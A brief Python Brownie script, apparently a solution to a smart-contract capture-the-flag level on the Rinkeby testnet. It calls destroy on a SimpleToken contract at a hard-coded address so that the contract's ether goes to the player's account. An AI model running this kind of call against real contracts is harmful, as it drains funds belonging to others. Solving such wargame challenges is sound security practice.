from brownie import SimpleToken, config,accounts

#check contract address of SimpleToken on rinkeby ether scan
contractAddress = '0x811241FDf097133072EC2D697f4dbC1dF0Ca5034'
player = accounts.add(config["wallets"]["from_key"])

def solution():
    contract=SimpleToken.at(contractAddress)
    contract.destroy(player.address,{"from":player})

def main():
    solution()